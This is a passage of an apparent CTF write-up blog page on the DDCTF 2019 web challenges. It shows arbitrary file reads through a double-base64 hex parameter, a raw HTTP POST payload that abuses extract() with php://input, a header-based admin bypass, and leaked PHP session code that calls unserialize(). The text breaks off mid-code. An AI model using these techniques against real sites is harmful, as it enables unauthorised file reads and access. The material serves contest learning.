@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>DDCTF-Web | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="ctf">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF-Web">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/6882/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="ctf">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/ddctf/12.png">
+<meta property="og:updated_time" content="2019-04-19T14:18:29.885Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF-Web">
+<meta name="twitter:description" content="ctf">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/ddctf/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">DDCTF-Web</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#滴"><span class="post-toc-number">1.</span> <span class="post-toc-text">滴~</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#WEB签到题"><span class="post-toc-number">2.</span> <span class="post-toc-text">WEB签到题</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Upload-IMG"><span class="post-toc-number">3.</span> <span class="post-toc-text">Upload-IMG</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#大吉大利-今晚吃鸡"><span class="post-toc-number">4.</span> <span class="post-toc-text">大吉大利,今晚吃鸡~</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#homebrew-event-loop"><span class="post-toc-number">5.</span> <span class="post-toc-text">homebrew event loop</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-ddctf-Web"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">DDCTF-Web</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-04-19 15:15:00" datetime="2019-04-19T07:15:00.000Z"  itemprop="datePublished">2019-04-19</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf/">ctf</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">26</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>这场比赛难度虽然大，但是一路做下来收获还是蛮大的<a id="more"></a></p>
+<h4 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h4><p>题目链接：<a href="http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09" target="_blank" rel="noopener">http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</a> </p>
+<p>将参数jpg的值进行两次base64解码得到<code>666C61672E6A7067</code>，再进行十六进制转字符串的处理后得到<code>flag.jpg</code>，然后在源代码看到了加载出了<code>flag.jpg</code>文件的源码，怀疑是通过文件读取函数<code>file_get_contents</code>进行读取图片，将<code>index.php</code>进行转十六进制并进行两次base64编码后的值<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code>赋值给参数<code>jpg</code>，得到经过base64加密后的源码：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/ddctf/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>解密后得到<code>index.php</code>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对读取文件做了过滤处理，首先是通过正则匹配函数过滤除了<code>a-z,A-Z,0-9</code>和小数点<code>.</code>以外的所有字符，并且将关键词<code>config</code>替换为<code>!</code>，看似flag就在<code>config.php</code>中，但是怎么想也绕不了过滤，这时注意到了代码开头的注释部分提示了一个博客地址，仔细翻阅博主的另一篇文章，里面提示一个文件名<code>practice.txt.swp</code>，访问，出现了文件名<code>f1ag!ddctf.php</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/ddctf/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>那么再次用同样的方法读取<code>flag!ddctf.php</code>文件的源代码，其中的感叹号<code>!</code>在参数中用<code>config</code>代替便可，即参数<code>$file == hex2bin(base64_encode(base64_encode(&#39;f1agconfigddctf.php&#39;)))</code></p>
+<p>获得f1ag!ddctf.php源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>考察变量覆盖和PHP伪协议，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /f1ag!ddctf.php?k=php://input&amp;uid=hello HTTP/1.1</span><br><span class="line">Host: 117.51.150.246</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">hello</span><br></pre></td></tr></table></figure>
+<p>得到flag：<code>DDCTF{436f6e67726174756c6174696f6e73}</code></p>
+<h4 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h4><p>题目链接：<a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a> </p>
+<p><img src="/img/ddctf/3.png" alt=""></p>
+<p>页面有401认证，查看源代码发现页面主题调用了方法<code>auth()</code>，注意到文件<code>js/index.js</code>，对其访问获得源码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/ddctf/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>js代码的大致意思是向<code>http://117.51.158.44/app/Auth.php</code>发送ajax请求，并设置了头部字段<code>didictf_username</code>，尝试头部字段<code>didictf_username:admin</code>时，页面响应内容为：<code>{&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;}</code>，发现了提示文件<code>app/fL2XID2i0Cdh.php</code>，访问后</p>
+<p>可以获得<code>/app/Application.php</code>和<code>/app/Session.php</code>两个文件的源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/app/Application.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/app/Session.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span 